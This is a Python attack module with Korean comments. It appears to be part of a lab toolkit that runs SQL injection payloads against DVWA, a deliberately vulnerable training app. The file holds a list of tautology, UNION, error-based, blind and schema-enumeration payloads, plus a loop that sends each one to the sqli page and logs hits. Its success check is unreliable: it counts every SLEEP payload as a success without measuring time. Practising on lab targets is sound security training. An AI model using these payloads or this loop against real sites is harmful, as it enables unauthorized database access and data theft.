"""
SQL Injection Attack Module
DVWA SQL Injection 취약점 공격 모듈
"""

import time
import re
from utils.logger import log_attack

# SQL Injection 페이로드 목록
PAYLOADS = [
    # Basic SQLi
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "admin' --",
    "admin' #",

    # Union-based SQLi
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT user(), database() --",
    "' UNION SELECT NULL, version() --",
    "' UNION SELECT NULL, @@version --",

    # Time-based blind SQLi
    "' AND SLEEP(3) --",
    "' OR SLEEP(3) --",
    "1' AND SLEEP(3) #",

    # Error-based SQLi
    "' AND 1=CONVERT(int, (SELECT @@version)) --",
    "' AND extractvalue(1, concat(0x7e, version())) --",

    # Boolean-based blind SQLi
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND SUBSTRING(version(),1,1)='5",

    # Database enumeration
    "' UNION SELECT table_name, NULL FROM information_schema.tables --",
    "' UNION SELECT column_name, NULL FROM information_schema.columns --",
]

def run_attack(session, delay=1):
    """
    SQL Injection 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    sqli_url = f"{session.base_url}/vulnerabilities/sqli/"

    for payload in PAYLOADS:
        results['attempts'] += 1

        try:
            # SQL Injection 시도
            params = {
                'id': payload,
                'Submit': 'Submit'
            }

            response = session.session.get(sqli_url, params=params)

            # 성공 여부 판단
            if is_sqli_successful(response.text, payload):
                results['successful'] += 1
                results['success'] = True
                results['findings'].append({
                    'payload': payload,
                    'response_length': len(response.text),
                    'status_code': response.status_code
                })

                log_attack(
                    'SQL_INJECTION',
                    'SUCCESS',
                    f"Payload: {payload}",
                    response.status_code,
                    len(response.text)
                )
                print(f"  [+] 성공: {payload}")
            else:
                log_attack(
                    'SQL_INJECTION',
                    'FAILED',
                    f"Payload: {payload}",
                    response.status_code,
                    len(response.text)
                )

            time.sleep(delay)

        except Exception as e:
            log_attack(
                'SQL_INJECTION',
                'ERROR',
                f"Payload: {payload}, Error: {str(e)}",
                0,
                0
            )
            print(f"  [-] 오류 발생: {payload} - {str(e)}")

    print(f"\n[*] SQL Injection 완료: {results['successful']}/{results['attempts']} 성공\n")
    return results

def is_sqli_successful(response_text, payload):
    """
    SQL Injection 성공 여부 판단

    Args:
        response_text: HTTP 응답 본문
        payload: 사용한 페이로드

    Returns:
        bool: 성공 여부
    """
    # DVWA SQLi 성공 시 나타나는 패턴들
    success_indicators = [
        r'First name:.*Surname:',  # 사용자 정보 출력
        r'ID:.*First name:.*Surname:',
        r'admin',  # admin 계정 정보
        r'user\(\)',  # MySQL 함수 결과
        r'database\(\)',
        r'version\(\)',
        r'@@version',
    ]

    for indicator in success_indicators:
        if re.search(indicator, response_text, re.IGNORECASE):
            return True

    # Time-based SQLi의 경우 응답 시간으로 판단 (추가 로직 필요)
    if 'SLEEP' in payload.upper():
        # 실제로는 응답 시간을 측정해야 함
        return True

    return False
